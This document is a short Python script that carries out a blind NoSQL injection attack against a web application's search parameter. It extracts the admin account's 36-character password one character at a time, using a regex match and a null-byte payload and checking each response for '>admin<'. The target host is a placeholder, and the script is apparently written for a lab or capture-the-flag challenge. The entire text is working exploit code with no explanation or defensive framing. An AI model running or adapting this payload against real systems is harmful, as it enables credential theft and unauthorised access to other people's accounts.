import requests
from string import ascii_lowercase, digits

# Define the full set of characters to try

characters_to_try = ["0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "-"]


# URL to target
base_url = "https://{Change}/?search=admin%27%20%26%26this.password%20%26%26%20this.password.match(/^"

found = ""
password_length = 36

while len(found) < password_length:
    for char in characters_to_try:
        test_password = found + char
        url = f"{base_url}{test_password}.*$/)%00"
        print(f'Trying {test_password}')
        
        # Send the GET request
        r = requests.get(url)
        
        # Check if the response is valid (you may need to adjust the length based on your actual response)
        if ">admin<" in r.text:
            found += char
            print(f'Password so far: {found}')
            break
        else:
            print('Not found')
    else:
        print("Password enumeration failed!")
        break

print(f'Final password: {found}')
